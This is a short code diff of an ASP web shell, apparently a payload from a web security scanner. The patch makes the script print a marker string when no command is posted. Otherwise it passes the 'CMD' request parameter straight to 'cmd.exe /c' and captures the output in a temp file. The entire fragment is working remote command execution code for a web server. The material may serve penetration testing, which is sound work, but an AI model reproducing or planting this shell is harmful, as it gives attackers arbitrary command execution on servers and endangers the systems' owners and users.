@@ -25,8 +25,9 @@
 
   ' -- check for a command that we have posted -- '
   szCMD = Request("CMD")
-  If (szCMD <> "") Then
-
+  If (szCMD == "") Then
+    Response.Write("w3" & "af")
+  Else
     ' -- Use a poor man's pipe ... a temp file -- '
     szTempFile = Request.ServerVariables("APPL_PHYSICAL_PATH") & oFileSys.GetTempName( )
     Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
